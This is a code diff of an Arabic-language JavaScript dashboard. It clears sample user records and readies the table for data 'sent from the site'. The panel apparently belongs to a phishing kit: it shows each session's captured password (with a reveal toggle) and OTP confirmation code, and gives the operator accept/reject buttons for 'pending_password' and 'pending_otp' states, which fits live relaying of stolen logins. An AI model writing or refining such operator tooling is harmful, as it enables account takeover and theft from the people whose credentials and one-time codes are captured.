@@ -235,17 +235,22 @@ function renderPend(s){
 function hidePend(){document.getElementById('pendSec').style.display='none';document.getElementById('ndot').style.display='none';lastSt=getS().status;}
 
 // USERS DATA
-const USERS=[
-  {id:1,name:'أحمد محمد',  email:'ahmed@gmail.com',  idNum:'1052345678',phone:'0501234567',address:'الرياض، حي النزهة',  ip:'192.168.1.10',device:'iPhone 14',  browser:'Safari', joined:'2024-01-15',country:'السعودية',status:'active'},
-  {id:2,name:'سارة علي',   email:'sara@gmail.com',   idNum:'2063456789',phone:'0567891234',address:'دبي، مدينة دبي',     ip:'192.168.1.22',device:'Samsung S23',browser:'Chrome', joined:'2024-02-03',country:'الإمارات',status:'active'},
-  {id:3,name:'محمد خالد',  email:'moh@gmail.com',    idNum:'2074567890',phone:'0531112222',address:'القاهرة، المعادي',   ip:'10.0.0.5',    device:'Pixel 7',   browser:'Firefox',joined:'2024-01-28',country:'مصر',    status:'inactive'},
-  {id:4,name:'فاطمة يوسف', email:'fatima@gmail.com', idNum:'2785678901',phone:'0509998887',address:'الكويت، الشويخ',    ip:'172.16.0.9',  device:'iPad Pro',  browser:'Safari', joined:'2024-03-10',country:'الكويت', status:'active'},
-  {id:5,name:'عبدالله نور',email:'abdallah@gmail.com',idNum:'2896789012',phone:'0543334444',address:'المنامة، العدلية', ip:'10.10.1.3',   device:'Laptop HP', browser:'Edge',   joined:'2024-02-20',country:'البحرين',status:'inactive'},
-];
+const USERS=[];
 
 let openDD=null;
 function renderTable(){
   const tb=document.getElementById('tbody');tb.innerHTML='';
+
+  if(!USERS.length){
+    tb.innerHTML=`
+      <tr>
+        <td colspan="7" style="text-align:center;padding:26px;color:var(--t2);font-size:14px;">
+          لا توجد بيانات حالياً. سيتم عرض البيانات الجديدة عند إرسالها من الموقع.
+        </td>
+      </tr>`;
+    return;
+  }
+
   USERS.forEach((u,i)=>{
     const tr=document.createElement('tr');
     tr.innerHTML=`
@@ -272,10 +277,7 @@ function renderTable(){
       const u=USERS.find(x=>x.id===id);
       const s=getS();
 
-      // بناء الـ dropdown
       const dd=document.createElement('div');dd.className='dd';
-
-      // قسم ١: معلومات المستخدم
       dd.innerHTML+=`
         <div class="ds">
           <div class="dsttl">معلومات المستخدم</div>
@@ -291,7 +293,6 @@ function renderTable(){
           <div class="drow"><span class="dk">الحالة</span><span class="dv">${u.status==='active'?'🟢 نشط':'🔴 غير نشط'}</span></div>
         </div>`;
 
-      // قسم ٢: بيانات الجلسة
       dd.innerHTML+=`
         <div class="ds">
           <div class="dsttl">بيانات الجلسة الحالية</div>
@@ -300,7 +301,6 @@ function renderTable(){
           <div class="drow"><span class="dk">رمز التأكيد</span><span class="dv hi" style="letter-spacing:3px">${s.otp||'—'}</span></div>
         </div>`;
 
-      // قسم ٣: أزرار القبول والرفض
       const st=s.status;
       const hasPending=st==='pending_password'||st==='pending_otp';
       if(hasPending){
@@ -314,11 +314,8 @@ function renderTable(){
       }
 
       wrap.appendChild(dd);openDD=wrap;
-
-      // reveal password
       document.getElementById('ddpv'+u.id)?.addEventListener('click',function(){this.classList.toggle('on');});
 
-      // accept/reject من الـ dropdown
       if(hasPending){
         const accept=()=>{
           const cur=getS().status;
